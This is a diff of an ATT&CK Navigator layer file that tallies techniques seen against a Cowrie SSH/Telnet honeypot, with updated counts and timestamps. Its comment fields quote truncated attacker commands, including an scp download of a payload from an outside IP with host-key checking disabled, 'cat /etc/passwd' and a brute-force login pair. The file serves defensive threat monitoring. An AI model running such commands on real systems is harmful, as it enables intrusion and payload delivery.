@@ -6,7 +6,7 @@
     "layer": "4.5"
   },
   "domain": "enterprise-attack",
-  "description": "Techniques observed against a Cowrie SSH/Telnet honeypot. Score is the number of times each technique was observed. Generated 2026-08-26 11:04:11",
+  "description": "Techniques observed against a Cowrie SSH/Telnet honeypot. Score is the number of times each technique was observed. Generated 2026-08-26 12:03:56",
   "filters": {
     "platforms": [
       "Linux"
@@ -22,9 +22,9 @@
   "techniques": [
     {
       "techniqueID": "T1110.001",
-      "score": 2071,
+      "score": 2128,
       "enabled": true,
-      "comment": "2071 observation(s) from 120 unique IP(s). e.g. frappe / epparf",
+      "comment": "2128 observation(s) from 129 unique IP(s). e.g. frappe / epparf",
       "metadata": [
         {
           "name": "tactic",
@@ -32,7 +32,7 @@
         },
         {
           "name": "unique source IPs",
-          "value": "120"
+          "value": "129"
         },
         {
           "name": "first seen",
@@ -40,15 +40,15 @@
         },
         {
           "name": "last seen",
-          "value": "2026-08-26T11:04:02"
+          "value": "2026-08-26T11:58:54"
         }
       ]
     },
     {
       "techniqueID": "T1078",
-      "score": 45,
+      "score": 48,
       "enabled": true,
-      "comment": "45 observation(s) from 42 unique IP(s). e.g. root / ",
+      "comment": "48 observation(s) from 44 unique IP(s). e.g. root / ",
       "metadata": [
         {
           "name": "tactic",
@@ -56,7 +56,7 @@
         },
         {
           "name": "unique source IPs",
-          "value": "42"
+          "value": "44"
         },
         {
           "name": "first seen",
@@ -64,15 +64,15 @@
         },
         {
           "name": "last seen",
-          "value": "2026-08-26T11:04:08"
+          "value": "2026-08-26T11:23:28"
         }
       ]
     },
     {
       "techniqueID": "T1222.002",
-      "score": 36,
+      "score": 37,
       "enabled": true,
-      "comment": "36 observation(s) from 7 unique IP(s). e.g. UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $",
+      "comment": "37 observation(s) from 8 unique IP(s). e.g. UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $",
       "metadata": [
         {
           "name": "tactic",
@@ -80,7 +80,7 @@
         },
         {
           "name": "unique source IPs",
-          "value": "7"
+          "value": "8"
         },
         {
           "name": "first seen",
@@ -88,15 +88,15 @@
         },
         {
           "name": "last seen",
-          "value": "2026-08-26T10:55:38"
+          "value": "2026-08-26T11:05:17"
         }
       ]
     },
     {
       "techniqueID": "T1105",
-      "score": 26,
+      "score": 29,
       "enabled": true,
-      "comment": "26 observation(s) from 7 unique IP(s). e.g. UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $",
+      "comment": "29 observation(s) from 9 unique IP(s). e.g. UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $",
       "metadata": [
         {
           "name": "tactic",
@@ -104,7 +104,7 @@
         },
         {
           "name": "unique source IPs",
-          "value": "7"
+          "value": "9"
         },
         {
           "name": "first seen",
@@ -112,7 +112,7 @@
         },
         {
           "name": "last seen",
-          "value": "2026-08-26T10:55:38"
+          "value": "2026-08-26T11:05:17"
         }
       ]
     },
@@ -142,9 +142,9 @@
     },
     {
       "techniqueID": "T1033",
-      "score": 5,
+      "score": 6,
       "enabled": true,
-      "comment": "5 observation(s) from 5 unique IP(s). e.g. id",
+      "comment": "6 observation(s) from 6 unique IP(s). e.g. id",
       "metadata": [
         {
           "name": "tactic",
@@ -152,7 +152,7 @@
         },
         {
           "name": "unique source IPs",
-          "value": "5"
+          "value": "6"
         },
         {
           "name": "first seen",
@@ -160,7 +160,7 @@
         },
         {
           "name": "last seen",
-          "value": "2026-08-26T10:55:02"
+          "value": "2026-08-26T11:05:17"
         }
       ]
     },
@@ -189,6 +189,30 @@
       ]
     },
     {
+      "techniqueID": "T1087.001",
+      "score": 3,
+      "enabled": true,
+      "comment": "3 observation(s) from 3 unique IP(s). e.g. cat /etc/passwd",
+      "metadata": [
+        {
+          "name": "tactic",
+          "value": "Discovery"
+        },
+        {
+          "name": "unique source IPs",
+          "value": "3"
+        },
+        {
+          "name": "first seen",
+          "value": "2026-08-26T01:40:56"
+        },
+        {
+          "name": "last seen",
+          "value": "2026-08-26T11:05:17"
+        }
+      ]
+    },
+    {
       "techniqueID": "T1070.004",
       "score": 2,
       "enabled": true,
@@ -209,30 +233,6 @@
         {
           "name": "last seen",
           "value": "2026-08-26T05:02:05"
-        }
-      ]
-    },
-    {
-      "techniqueID": "T1087.001",
-      "score": 2,
-      "enabled": true,
-      "comment": "2 observation(s) from 2 unique IP(s). e.g. cat /etc/passwd",
-      "metadata": [
-        {
-          "name": "tactic",
-          "value": "Discovery"
-        },
-        {
-          "name": "unique source IPs",
-          "value": "2"
-        },
-        {
-          "name": "first seen",
-          "value": "2026-08-26T01:40:56"
-        },
-        {
-          "name": "last seen",
-          "value": "2026-08-26T02:13:06"
         }
       ]
     },
@@ -268,7 +268,7 @@
       "#f85149"
     ],
     "minValue": 0,
-    "maxValue": 2071
+    "maxValue": 2128
   },
   "legendItems": [
     {
